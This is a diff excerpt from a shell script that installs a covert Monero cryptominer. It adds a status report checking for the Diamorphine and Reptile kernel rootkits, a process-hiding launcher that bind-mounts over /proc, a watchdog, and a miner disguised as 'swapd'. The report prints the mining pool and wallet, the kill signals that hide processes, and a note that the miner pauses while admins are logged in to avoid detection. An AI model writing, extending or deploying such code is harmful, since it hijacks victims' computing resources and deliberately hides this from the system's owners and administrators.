@@ -2561,3 +2561,74 @@ else
 fi
 
 if lsmod | grep -q diamorphine 2>/dev/null; then
+    echo "  ✓ Diamorphine: ACTIVE (kernel rootkit)"
+else
+    echo "  ○ Diamorphine: Not loaded"
+fi
+
+if [ -d /reptile ] || lsmod | grep -q reptile 2>/dev/null; then
+    echo "  ✓ Reptile: ACTIVE (kernel rootkit)"
+else
+    echo "  ○ Reptile: Not loaded"
+fi
+
+if [ -f /usr/local/bin/system-watchdog ]; then
+    echo "  ✓ Intelligent Watchdog: ACTIVE (3-min, state-tracked)"
+else
+    echo "  ○ Watchdog: Not deployed"
+fi
+
+if [ -f /root/.swapd/launcher.sh ]; then
+    echo "  ✓ launcher.sh: ACTIVE (mount --bind /proc hiding)"
+else
+    echo "  ○ launcher.sh: Not created"
+fi
+
+echo "  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling"
+echo "  ✓ Miner renamed: 'swapd' (stealth binary name)"
+
+echo ""
+echo "Installation Method:"
+if [ "$USE_WGET" = true ]; then
+    echo "  Download Tool: wget (curl SSL/TLS failed)"
+else
+    echo "  Download Tool: curl"
+fi
+
+# Check how the file was obtained
+if [ -f /tmp/.local_file_used ]; then
+    echo "  Download Mode: Local file (from script directory)"
+    rm -f /tmp/.local_file_used
+elif [ -f /tmp/.manual_upload_used ]; then
+    echo "  Download Mode: Manual upload (SSL too old for HTTPS)"
+    rm -f /tmp/.manual_upload_used
+else
+    echo "  Download Mode: Automatic download"
+fi
+
+echo ""
+echo "Mining Configuration:"
+echo "  Binary:  /root/.swapd/swapd"
+echo "  Config:  /root/.swapd/config.json"
+echo "  Wallet:  $WALLET"
+echo "  Pool:    gulf.moneroocean.stream:80"
+
+echo ""
+echo "Process Hiding Commands:"
+echo "  Hide:    kill -31 \$PID  (requires Diamorphine)"
+echo "  Unhide:  kill -63 \$PID  (requires Diamorphine)"
+echo "  Reptile: /reptile/reptile_cmd hide"
+
+echo ""
+echo "========================================================================="
+echo "[*] Miner will auto-stop when admins login and restart when they logout"
+echo "[*] All processes are hidden via multiple stealth layers"
+echo "========================================================================="
+
+#echo ""
+#echo "Miner Details:"
+#echo "  Binary:  /root/.swapd/swapd"
+#echo "  Config:  /root/.swapd/config.json"
+#echo "  Wallet:  $WALLET"
+#echo ""
+#echo "========================================================================="
